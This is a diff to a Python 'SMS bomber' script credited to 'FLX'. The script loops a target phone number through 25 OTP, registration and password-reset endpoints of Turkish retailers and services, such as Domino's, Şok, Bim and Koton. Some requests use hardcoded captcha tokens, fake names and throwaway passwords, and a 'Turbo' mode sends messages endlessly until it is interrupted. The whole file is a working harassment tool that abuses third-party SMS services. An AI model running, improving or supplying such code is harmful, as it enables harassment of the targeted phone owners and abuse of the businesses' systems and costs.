@@ -9,9 +9,6 @@ from urllib3.util import url
 
 init(autoreset=True)
 
-
-
-
 sms = ["████████████████████████████  ███████                       ███████  ████████████████████████████",
        "████████████████████████████  ████████████             ████████████  ████████████████████████████",
        "████████████████████████████  █████████████           █████████████  ████████████████████████████",
@@ -33,9 +30,6 @@ sms = ["████████████████████████
        "████████████████████████████  ███████                       ███████  ████████████████████████████",
        "████████████████████████████  ███████                       ███████  ████████████████████████████",
        ]
-
-
-
 
 flx = [
     "███████████████████████████████      ███████████                        ███████████        ███████████",
@@ -60,14 +54,15 @@ flx = [
     "███████████                          ████████████████████████████       ███████████        ███████████",
 ]
 
-def sok (numara):
+
+def sok(numara):
     url = "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate"
     payload = {
-        "captchaAction" : "generate_register_otp",
-        "captchaToken" : "",
-        "clientId" : "buyer-web",
-        "phoneNumber" : numara,
-        "reCaptchaV2" :False
+        "captchaAction": "generate_register_otp",
+        "captchaToken": "",
+        "clientId": "buyer-web",
+        "phoneNumber": numara,
+        "reCaptchaV2": False
     }
     headers = {
         "Content-Type": "application/json",
@@ -75,15 +70,16 @@ def sok (numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN +"[+] Şok Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Şok Başarılı!")
     else:
-        print(Fore.RED + "[-] Şok Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Şok Başarısız!")
+
 
 def kahvedunyasi(numara):
     url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
     paykoad = {
-        "countryCode" : "90",
-        "phoneNumber" : numara,
+        "countryCode": "90",
+        "phoneNumber": numara,
     }
     headers = {
         "Content-Type": "application/json",
@@ -91,19 +87,20 @@ def kahvedunyasi(numara):
     }
     response = requests.post(url, json=paykoad, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN+ "[+] KahveDünyası Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" KahveDünyası Başarılı!")
     else:
-        print(Fore.RED+ "[+] KahveDünyası Başarısız!")
+        print(Fore.RED + "[+] " + numara + " ------>"" KahveDünyası Başarısız!")
+
 
 def dominosgiris(numara):
     url = "https://frontend.dominos.com.tr/api/authentication/sendLoginOtpCode"
     payload = {
-        "captchaToken" : "03AFcWeA4uOFC5Bvy2gGdsKR-iADZjBWZ7ac4o31US1ZEa2BHFt0FEvEPV0hhNwGjG98uheeORhHISBHX4lnHG04iigH_X7hoPbdMnCAmp2BE4GXzKGZH28x3a75JlFhcK_QfXGistOKYIZkvirTtQDn8C2Jjp00nOLm-uOgZepYU0_gHcUQcQAseGuaJwqDCffT4hAIu2Qz6yTmp9HcqI6DV76yZdqAjL9qJS_Pj54aNCBzvNxPNu7oITVusj4FlIZzn3-5F1bBrXn6d1IAO8k0OHUiIic28oFtupijEGa0WagcppHmx7NiUXPIWv_nnIYII5aFB9_sgWA_UZkdN4W_OfDcq2aM4UPanCe5KIlcz6PpKDFWjquacoEu8XFA--4WYiQVELdQYYjU13MD59bSx4MQI5gn-P2mkAF_t8nvNraLWKv9CriJY9nDdDmzhGO3u_7Tprce934lDWCEItyX7h4yInKOrfWMRzC1QqLO5NuSXAQcCeWMfPUn2CHOIDhow_KgsQjHvqWzTMMT00A70m4IQ1v9_SZtguiHFbbE097umfJQN5ZskRNKr9zWrCcCdwDQMZqI-jzJ95xRuzcZoPm47z8hzn_rrAfTLvt2pzdRgE4Z3z1LMkeaD9Vr000uU9wRVEumeDzrLuAzo-2sOHwF5GCQPdPzYGI070DtL2da92esomlxG1u66gIDDbTg4mypWvBhTQVglNl0IapgXg1SQa8bx3fPwLlgL9xk051uvFxjREdI2usnS95vWhVlprb4b1orgnfvfV18Ticsbv4eV8L2PM9Q4q6oy_vVBS4XNNroYpwM9gqIn6zuTm_q1UZLYCMiWaTt17o80Y2kCqtg2nBNS7DwJB5XVqxp_qHcdeciM9EFawZP698J1KvcYzLt7wRvUK_JD3AWsQiYR9K0L0QtWNhwSE0hHjQmzT_QQ3y4uZkXQ",
+        "captchaToken": "03AFcWeA4uOFC5Bvy2gGdsKR-iADZjBWZ7ac4o31US1ZEa2BHFt0FEvEPV0hhNwGjG98uheeORhHISBHX4lnHG04iigH_X7hoPbdMnCAmp2BE4GXzKGZH28x3a75JlFhcK_QfXGistOKYIZkvirTtQDn8C2Jjp00nOLm-uOgZepYU0_gHcUQcQAseGuaJwqDCffT4hAIu2Qz6yTmp9HcqI6DV76yZdqAjL9qJS_Pj54aNCBzvNxPNu7oITVusj4FlIZzn3-5F1bBrXn6d1IAO8k0OHUiIic28oFtupijEGa0WagcppHmx7NiUXPIWv_nnIYII5aFB9_sgWA_UZkdN4W_OfDcq2aM4UPanCe5KIlcz6PpKDFWjquacoEu8XFA--4WYiQVELdQYYjU13MD59bSx4MQI5gn-P2mkAF_t8nvNraLWKv9CriJY9nDdDmzhGO3u_7Tprce934lDWCEItyX7h4yInKOrfWMRzC1QqLO5NuSXAQcCeWMfPUn2CHOIDhow_KgsQjHvqWzTMMT00A70m4IQ1v9_SZtguiHFbbE097umfJQN5ZskRNKr9zWrCcCdwDQMZqI-jzJ95xRuzcZoPm47z8hzn_rrAfTLvt2pzdRgE4Z3z1LMkeaD9Vr000uU9wRVEumeDzrLuAzo-2sOHwF5GCQPdPzYGI070DtL2da92esomlxG1u66gIDDbTg4mypWvBhTQVglNl0IapgXg1SQa8bx3fPwLlgL9xk051uvFxjREdI2usnS95vWhVlprb4b1orgnfvfV18Ticsbv4eV8L2PM9Q4q6oy_vVBS4XNNroYpwM9gqIn6zuTm_q1UZLYCMiWaTt17o80Y2kCqtg2nBNS7DwJB5XVqxp_qHcdeciM9EFawZP698J1KvcYzLt7wRvUK_JD3AWsQiYR9K0L0QtWNhwSE0hHjQmzT_QQ3y4uZkXQ",
         "channelCode": "WEB",
-        "email" : "",
-        "isRegisterV2" : False,
-        "isSure" : False,
-        "mobilePhone" : numara
+        "email": "",
+        "isRegisterV2": False,
+        "isSure": False,
+        "mobilePhone": numara
     }
     headers = {
         'Content-Type': 'application/json',
@@ -111,9 +108,9 @@ def dominosgiris(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN+ "[+] Dominos Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Dominos Başarılı!")
     else:
-        print(Fore.RED+ "[-] Dominos Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Dominos Başarısız!")
 
 
 def kimgbister(numara):
@@ -134,16 +131,16 @@ def kimgbister(numara):
         try:
             data = response.json()
             if data.get("code") == "login_otp_locked":
-                print(Fore.RED + "[-] kimgbister OTP kilitli, gönderim engellendi!")
+                print(Fore.RED + "[-] " + numara + " ------>"" kimgbister OTP kilitli, gönderim engellendi!")
             else:
-                print(Fore.GREEN + "[+] kimgbister Başarılı!")
+                print(Fore.GREEN + "[+] " + numara + " ------>"" kimgbister Başarılı!")
         except json.JSONDecodeError:
-            print(Fore.YELLOW + "[!] kimgbister: JSON çözümlenemedi ama status 200")
+            print(Fore.YELLOW + "[!] " + numara + " ------>"" kimgbister: JSON çözümlenemedi ama status 200")
     else:
-        print(Fore.RED + "[-] kimgbister Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" kimgbister Başarısız!")
 
 
-def  bitlo(numara):
+def bitlo(numara):
     url = "https://api.bitlo.com/auth/forgot-password"
     payload = {
         "identifier": "+90" + numara,
@@ -154,12 +151,12 @@ def  bitlo(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == [200, 1015]:
-        print(Fore.GREEN + "[+] Bitlo Başarılı")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Bitlo Başarılı")
     else:
-        print(Fore.RED + "[-] Bitlo Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Bitlo Başarısız!")
+
 
 def koton(numara):
-
     url = "https://www.koton.com/users/register/"  # Buraya doğru endpoint gelecek
 
     payload = {
@@ -185,16 +182,12 @@ def koton(numara):
         "Referer": "https://www.koton.com/users/register/"
     }
 
-
     response = requests.post(url, json=payload, headers=headers)
 
     if response.status_code == 200 or 202:
-        print(Fore.GREEN+ "[+] Koton Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Koton Başarılı!")
     else:
-        print(Fore.RED+ "[-] Koton Başarısız!")
-
-
-
+        print(Fore.RED + "[-] " + numara + " ------>"" Koton Başarısız!")
 
 
 def tıklagelsin(numara):
@@ -225,57 +218,47 @@ def tıklagelsin(numara):
     headers = {
         "Content-Type": "application/json",
         "Accept": "application/json",
-        # Gerekirse User-Agent veya diğer headerları da ekle
     }
 
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
         result = response.json()
         if result.get("data", {}).get("generateOtp") is not None:
-            print(Fore.GREEN + "[+] TiklaGelsin Başarılı!")
+            print(Fore.GREEN + "[+] " + numara + " ------>"" TiklaGelsin Başarılı!")
         else:
-            print(Fore.RED + "[-] TıklaGelsin Başarısız!")
-
-
-
-
-
+            print(Fore.RED + "[-] " + numara + " ------>"" TıklaGelsin Başarısız!")
 
 
 def englishhome(numara):
-    url = "https://www.englishhome.com/api/member/sendOtp"
+    url = "https://www.englishhome.com:443/api/member/sendOtp"
     payload = {
         "Phone": numara,
         "XID": ""
     }
-    headers = {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-    }
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*",
+               "Referer": "https://www.englishhome.com/", "Content-Type": "application/json",
+               "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty",
+               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"
+               }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        result = response.json()
-        if result.get("isError") == False:
-            print(Fore.GREEN + "[+] Englishhome Başarılı!")
-        else:
-            print(Fore.RED + "[-] Englishhome Başarısız!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Naos Başarılı!")
     else:
-        print(Fore.RED + "[-] Englishhome Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Naos Başarısız!")
 
 
 def naos(numara):
     url = "https://naosstars.com/api/smsSend/0f6a94f0-31ac-4e49-9755-eac060de07be"
     payload = {
-        "email" : "sms@yopmail.com",
+        "email": "sms@yopmail.com",
         "first_name": "fawewdwaaeq",
-        "invitation_code" : "",
-        "kvkk" : "1",
-        "last_name" : "dwafawfwa",
-        "new_password" : "6hspHE5jLhZwaZN",
-        "telephone" : "(+90)" + numara,
-        "type" : "register",
-        "user_check" : "1",
+        "invitation_code": "",
+        "kvkk": "1",
+        "last_name": "dwafawfwa",
+        "new_password": "6hspHE5jLhZwaZN",
+        "telephone": "(+90)" + numara,
+        "type": "register",
+        "user_check": "1",
     }
     headers = {
         'Content-Type': 'application/json',
@@ -283,23 +266,24 @@ def naos(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Naos Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Englishhome Başarılı!")
     else:
-        print(Fore.RED + "[-] Naos Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Englishhome Başarısız!")
+
 
 def evidia(numara):
     url = "https://www.evidea.com/users/register/"
     payload = {
-        "confirm" : True,
-        "email" : "sms@yopmail.com",
-        "first_name" : "Fawewdwaaeq",
-        "g-recaptcha-response":"03AFcWeA73_E4Zb1tr_VrZTZ5dV0d44L3xucAu47xcaCApclsUwKzzvWmCrcLiYoutmhOOMqq915bnEQCPVAqEBN5vGfuucToZWNZBKTueVY6svQXpHolA8lzp0wrwKD7a9GOOlO4sFdhHmuo8Kg6SMzLYTPzFlh5c9JJeOP-WF5-K5n-BIbHcgcpbsj9jNpnud-x-idgfdlOFQUK3Bq2oQy_aEW3HwvSnobIcAW1mD82FhgMBzJPBeVCMeEnqubrRIJ18Zd5IjXea_tUAEN4JulJf6xU7r6YUJegba9j3izASoHxYFnrZFWIooYlU9sinRaFCH17EBOLQYeCvZjfMzGO22rnUZUmQG6g4QrnAzrEkOwu9s3qhY3gu95irqwA2RQ92Qvokw0j3w1P9bCg0Kllo1Y3HYVXk5EtNKMQC4rMX3ku3dyXtlwJ21a6xLaKINL_MlAA9v25-dxr4ZD3ZxFRz0AB_-jtTFXhdmf5BRmPszThm17S88Wy73G2gnwpKoqP3_f-I5G6CKFNbnpkq7nSjfhFu7Tdaen9wfPWw92NwvTHgmepCUXMc1wxQ9ar8aMphe5AV7uuMJs82RAe51PK8R-OfZ-EB3Q4RDdebCgiVVpG80T8eo5X7sSyYLbs-54UZYzqU0QCfDitoGVvpTGhz_CpZjHxSJlPk-P917lwixqtA5FbOs6FPzdqc3ZU7QeiOG5KVNf8PVFECXMtIgNAW69Dg6R3lhEB4JH2BGxjZB-iBwubwuJlgagqRL_GQL64Yp7n4u4HGaRWEVp1t6qzUmAKERWVVM6MGCZHRAmXl-27MKCQ7tZ0ZGYY0YZepCVj-DnTedZ417uDwdNeUwhR6gcr_WiHY0zuVolgMoHfB8AVzIZV2E6h9Zfzc6QbfdUM0Bm6ht9x6TOjXvbNR02oX56KW5XXW3_0JBco8CVMg2u1HoxCpi4c",
-        "last_name" : "Aoıwaeju",
+        "confirm": True,
+        "email": "sms@yopmail.com",
+        "first_name": "Fawewdwaaeq",
+        "g-recaptcha-response": "03AFcWeA73_E4Zb1tr_VrZTZ5dV0d44L3xucAu47xcaCApclsUwKzzvWmCrcLiYoutmhOOMqq915bnEQCPVAqEBN5vGfuucToZWNZBKTueVY6svQXpHolA8lzp0wrwKD7a9GOOlO4sFdhHmuo8Kg6SMzLYTPzFlh5c9JJeOP-WF5-K5n-BIbHcgcpbsj9jNpnud-x-idgfdlOFQUK3Bq2oQy_aEW3HwvSnobIcAW1mD82FhgMBzJPBeVCMeEnqubrRIJ18Zd5IjXea_tUAEN4JulJf6xU7r6YUJegba9j3izASoHxYFnrZFWIooYlU9sinRaFCH17EBOLQYeCvZjfMzGO22rnUZUmQG6g4QrnAzrEkOwu9s3qhY3gu95irqwA2RQ92Qvokw0j3w1P9bCg0Kllo1Y3HYVXk5EtNKMQC4rMX3ku3dyXtlwJ21a6xLaKINL_MlAA9v25-dxr4ZD3ZxFRz0AB_-jtTFXhdmf5BRmPszThm17S88Wy73G2gnwpKoqP3_f-I5G6CKFNbnpkq7nSjfhFu7Tdaen9wfPWw92NwvTHgmepCUXMc1wxQ9ar8aMphe5AV7uuMJs82RAe51PK8R-OfZ-EB3Q4RDdebCgiVVpG80T8eo5X7sSyYLbs-54UZYzqU0QCfDitoGVvpTGhz_CpZjHxSJlPk-P917lwixqtA5FbOs6FPzdqc3ZU7QeiOG5KVNf8PVFECXMtIgNAW69Dg6R3lhEB4JH2BGxjZB-iBwubwuJlgagqRL_GQL64Yp7n4u4HGaRWEVp1t6qzUmAKERWVVM6MGCZHRAmXl-27MKCQ7tZ0ZGYY0YZepCVj-DnTedZ417uDwdNeUwhR6gcr_WiHY0zuVolgMoHfB8AVzIZV2E6h9Zfzc6QbfdUM0Bm6ht9x6TOjXvbNR02oX56KW5XXW3_0JBco8CVMg2u1HoxCpi4c",
+        "last_name": "Aoıwaeju",
         "password": "L3Pr66pinxzaH9L",
-        "password-repeat" : "L3Pr66pinxzaH9L",
-        "phone": "0"+numara,
-        "phone-two" : "0"+numara,
-        "sms_allowed" : True,
+        "password-repeat": "L3Pr66pinxzaH9L",
+        "phone": "0" + numara,
+        "phone-two": "0" + numara,
+        "sms_allowed": True,
     }
     headers = {
         "Accept": "application/json",
@@ -307,19 +291,20 @@ def evidia(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == [200, 202]:
-        print(Fore.GREEN + "[+] Evidia Başarılı!")
-    else:                                                #BURAYI YAPPPPP EKSİK OLDU HATA KODU
-        print(Fore.RED + "[-] Evidia Başarısız!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Evidia Başarılı!")
+    else:
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Evidia Başarılı!")
+
 
 def occasion(numara):
     url = "https://www.occasion.com.tr/users/registration/"
     payload = {
-        "next" : "/account/profile/",
-        "date_of_birth":  "01-01-2001",
-        "first_name" : "Ssawdwad",
-        "last_name" : "Adwafad",
-        "email" : "sms@yopmail.com",
-        "phone" : "0"+numara,
+        "next": "/account/profile/",
+        "date_of_birth": "01-01-2001",
+        "first_name": "Ssawdwad",
+        "last_name": "Adwafad",
+        "email": "sms@yopmail.com",
+        "phone": "0" + numara,
         "password": "Awaeyaw78eawue231!",
         "is_allowed": True,
         "confirm": True,
@@ -334,9 +319,10 @@ def occasion(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == [200, 202]:
-        print(Fore.GREEN + "[+] Occasion Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Occasion Başarılı!")
     else:
-        print(Fore.GREEN + "[+] Occasion Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Occasion Başarılı!")
+
 
 def damattween(numara):
     url = "https://www.damattween.com/users/register/"
@@ -345,8 +331,8 @@ def damattween(numara):
         "first_name": "sawdwafdwa",
         "last_name": "awdwdsawf",
         "password": "Asawegawyue1273!",
-        "phone": "0"+numara,
-        "confirm" : True,
+        "phone": "0" + numara,
+        "confirm": True,
         "email_allowed": True,
     }
     headers = {
@@ -355,15 +341,16 @@ def damattween(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == [200, 202]:
-        print(Fore.GREEN + "[+] Damattween Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Damattween Başarılı!")
     else:
-        print(Fore.GREEN + "[+] Damattween Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Damattween Başarılı!")
+
 
 def sportive(numara):
     url = "https://www.sportive.com.tr/api/client/users/check?options=%7B%22contentType%22%3A%22application%2Fjson%22%2C%22responseType%22%3A%22json%22%7D"
     payload = {
-        "otp_send" : True,
-        "phone" : "0"+numara,
+        "otp_send": True,
+        "phone": "0" + numara,
     }
     headers = {
         "Accept": "application/json",
@@ -371,24 +358,25 @@ def sportive(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Sportive Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Sportive Başarılı!")
     else:
-        print(Fore.GREEN + "[+] Sportive Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Sportive Başarılı!")
+
 
 def mudo(numara):
     url = "https://www.mudo.com.tr/users/register/"
     payload = {
-        "add_loyalty" : True,
-        "confirm" : True,
-        "date_of_birth" : "2001-01-01",
+        "add_loyalty": True,
+        "confirm": True,
+        "date_of_birth": "2001-01-01",
         "email": "sms@yopmail.com",
         "email_allowed": True,
-        "first_name" : "Ssawdwad",
-        "gender" : "null",
-        "last_name" : "Adwafad",
+        "first_name": "Ssawdwad",
+        "gender": "null",
+        "last_name": "Adwafad",
         "password": "gZUB7zxy9YJLQTR!",
-        "phone" : numara,
-        "sms_allowed" : True,
+        "phone": numara,
+        "sms_allowed": True,
     }
     headers = {
         "Accept": "application/json",
@@ -396,49 +384,54 @@ def mudo(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == [200, 202]:
-        print(Fore.GREEN + "[+] Mudo Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Mudo Başarılı!")
     else:
-        print(Fore.GREEN + "[+] Mudo Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Mudo Başarılı!")
+
 
 def houseofsuperstep(numara):
     url = "https://www.houseofsuperstep.com/users/register/"
     payload = {
-    "call_allowed": True,
-    "confirm": True,
-    "date_of_birth": "2001-01-01",
-    "email": "sms@yopmail.com",
-    "email_allowed": True,
-    "first_name": "fawewaeq",
-    "gender": "male",
-    "kvkk_confirm": True,
-    "last_name": "SwaewadS",
-    "password": "Aawjeuwaıheuıwa!324",
-    "phone": "0"+numara,
-    "sms_allowed": True
-}
+        "call_allowed": True,
+        "confirm": True,
+        "date_of_birth": "2001-01-01",
+        "email": "sms@yopmail.com",
+        "email_allowed": True,
+        "first_name": "fawewaeq",
+        "gender": "male",
+        "kvkk_confirm": True,
+        "last_name": "SwaewadS",
+        "password": "Aawjeuwaıheuıwa!324",
+        "phone": "0" + numara,
+        "sms_allowed": True
+    }
     headers = {
         "Accept": "application/json",
         "Content-Type": "application/json",
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Houseofss Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Houseofss Başarılı!")
     else:
-        print(Fore.GREEN + "[+] Houseofss Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Houseofss Başarılı!")
+
 
 def Bim(numara):
-    try:
-        bim = requests.post(
-            "https://bim.veesk.net:443/service/v1.0/account/login",
-            json={"phone": numara},
-            timeout=6
-        )
-        if bim.status_code == 200:
-            print(Fore.GREEN + "[+] Bim Başarılı!")
-        else:
-            print(Fore.GREEN + "[+] Bim Başarılı!")
-    except Exception as e:
-        print(Fore.GREEN + "[+] Bim Başarılı!")
+    url = "https://bim.veesk.net:443/service/v1.0/account/login"
+    payload = {
+        "phone": numara,
+    }
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+    }
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 200:
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Bim Başarılı!")
+    else:
+        print(Fore.RED + "[-] " + numara + " ------>"" Bim Başarısız!")
+
+
 
 
 def komagene(numara, token=None):
@@ -459,9 +452,9 @@ def komagene(numara, token=None):
 
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Komagene Başarılı!")
+        print(Fore.GREEN + "[+] "+numara+" ------>"" Komagene Başarılı!")
     else:
-        print(Fore.RED + "[-] Komagene Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" Komagene Başarısız!")
 
 
 def ozdilekteyim(numara):
@@ -478,21 +471,21 @@ def ozdilekteyim(numara):
         "User-Agent": "Mozilla/5.0"
     }
     response = requests.post(base_url, params=params, headers=headers)
-    if response.status_code == [200,201]:
-        print(Fore.GREEN + "[+] Özdilekteyim Başarılı!")
+    if response.status_code == [200, 201]:
+        print(Fore.GREEN + "[+] "+numara+" ------>"" Özdilekteyim Başarılı!")
     else:
-        print(Fore.RED + "[-] Özdilekteyim Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" Özdilekteyim Başarısız!")
 
 
 def ikinciyeni(numara):
     url = "https://apigw.ikinciyeni.com/RegisterRequest"
     payload = {
-        "accountType" : "1",
-        "email" : "sms@yopmail.com",
-        "isAddPermission" : True,
-        "lastName" : "sawdawd",
-        "name" : "edaweawe",
-        "phone" : numara,
+        "accountType": "1",
+        "email": "sms@yopmail.com",
+        "isAddPermission": True,
+        "lastName": "sawdawd",
+        "name": "edaweawe",
+        "phone": numara,
     }
     headers = {
         "Accept": "application/json",
@@ -500,14 +493,14 @@ def ikinciyeni(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] İkinciyeni Başarılı!")
+        print(Fore.GREEN + "[+] "+numara+" ------>"" İkinciyeni Başarılı!")
     else:
-        print(Fore.RED + "[-] İkinciyeni Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" İkinciyeni Başarısız!")
 
 
 def totalenergies(numara):
     url = "https://apimobile.guzelenerji.com.tr/exapi/profile"
-    payload =  {
+    payload = {
         "first_name": "Awddaw",
         "last_name": "Dwaddwa",
         "date_of_birth": "1977-07-08T00:00:00-03:00",
@@ -539,9 +532,9 @@ def totalenergies(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Totalenergies Başarılı!")
+        print(Fore.GREEN + "[+] "+numara+" ------>"" Totalenergies Başarılı!")
     else:
-        print(Fore.RED + "[-] Totalenergies Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" Totalenergies Başarısız!")
 
 
 def pinarsu(numara):
@@ -555,9 +548,10 @@ def pinarsu(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Pinarsu Başarılı!")
+        print(Fore.GREEN + "[+] "+numara+" ------>"" Pinarsu Başarılı!")
     else:
-        print(Fore.RED + "[-] Pinarsu Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" Pinarsu Başarısız!")
+
 
 def filemarket(numara):
     url = "https://api.filemarket.com.tr:443/v1/otp/send"
@@ -570,9 +564,10 @@ def filemarket(numara):
                }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 202:
-        print(Fore.GREEN + "[+] Filemarket Başarılı!")
+        print(Fore.GREEN + "[+] "+numara+" ------>"" Filemarket Başarılı!")
     else:
-        print(Fore.RED + "[-] Filemarket Başarısız! ")
+        print(Fore.RED + "[-] "+numara+" ------>"" Filemarket Başarısız! ")
+
 
 def digital(numara):
     url = "https://api.345dijital.com:443/api/users/register"
@@ -588,10 +583,11 @@ def digital(numara):
                "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"
                }
     response = requests.post(url, json=payload, headers=headers)
-    if response.status_code == [200 , 202]:
-        print(Fore.GREEN + "[+] 345Digital Başarılı!")
+    if response.status_code == [200, 202]:
+        print(Fore.GREEN + "[+] "+numara+" ------>"" 345Digital Başarılı!")
     else:
-        print(Fore.RED + "[-] 345Digital Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" 345Digital Başarısız!")
+
 
 def money(numara):
     url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
@@ -608,19 +604,42 @@ def money(numara):
                }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] Money Başarılı!")
+        print(Fore.GREEN + "[+] "+numara+" ------>"" Money Başarılı!")
     else:
-        print(Fore.RED + "[- Money Başarısız!")
+        print(Fore.RED + "[-] "+numara+" ------>"" Money Başarısız!")
+           
+main = [money,
+        digital,
+        filemarket,
+        pinarsu,
+        totalenergies, 
+        ikinciyeni,
+        ozdilekteyim,
+        komagene,
+        totalenergies,
+        Bim,
+        houseofsuperstep,
+        mudo, 
+        sportive,
+        damattween, 
+        occasion, 
+        evidia,
+        kahvedunyasi,
+        dominosgiris,
+        kimgbister,
+        bitlo,
+        koton,
+        tıklagelsin,
+        englishhome,
+        naos, 
+        sok]
 
-
-
-main =  [money, digital, filemarket, pinarsu, totalenergies, ikinciyeni, ozdilekteyim, komagene, totalenergies, Bim, houseofsuperstep, mudo, sportive, damattween, occasion, evidia, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome, naos,sok]
 os.system("cls" if os.name == "nt" else "clear")
 for line in flx:
     print(Fore.RED + line)
 
-print("Developer By : FLX                    Sms Bomber\n")
-print(Fore.MAGENTA +"25 SMS SERVİS\n")
+print("Developer By : FLX       İG : @x__flx__        Sms Bomber\n")
+print(Fore.MAGENTA + "25 SMS SERVİS\n")
 
 print(Fore.YELLOW + "1 - Normal Sms")
 print(Fore.YELLOW + "2 - Turbo Sms")
@@ -653,7 +672,7 @@ if seçim == "1":
 
     os.system("cls" if os.name == "nt" else "clear")
     adet_input = input(Fore.YELLOW + "Kaç adet sms gönderilsin? (Enter = sonsuz): ").strip()
-    print("\n"*500)
+    print("\n" * 500)
     for line in sms:
         print(Fore.RED + line)
     if adet_input == "":
@@ -689,7 +708,7 @@ elif seçim == "2":
     i = 0
     try:
         while True:
-            func = main[i]
+            func = main[i % len(main)]
             func(numara)
             i += 1
     except KeyboardInterrupt:
